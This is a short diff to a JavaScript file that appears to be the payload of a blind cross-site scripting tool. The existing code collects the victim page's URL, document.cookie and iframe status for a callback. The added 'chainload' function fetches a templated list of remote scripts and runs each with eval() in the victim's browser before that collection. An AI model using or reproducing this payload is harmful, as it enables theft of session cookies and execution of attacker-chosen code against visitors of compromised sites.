@@ -51,7 +51,19 @@ function callback(data) {
     });
 }
 
+function chainload(scripts) {
+    scripts.forEach( (uri) => {
+        fetch(uri).then( resp => {
+            resp.text().then( script => {
+                eval(script);
+            })
+        });
+    });
+}
+
 function main() {
+    const scripts = {{ CHAINLOAD }};
+
     const collection = {
         "uri": "location.toString()",
         "cookies": "document.cookie",
@@ -65,6 +77,7 @@ function main() {
         "was_iframe": "(!(window.top === window)).toString()",
     };
 
+    chainload(scripts);
     collect_data(collection).then( (data) => callback(data) );
 }
 
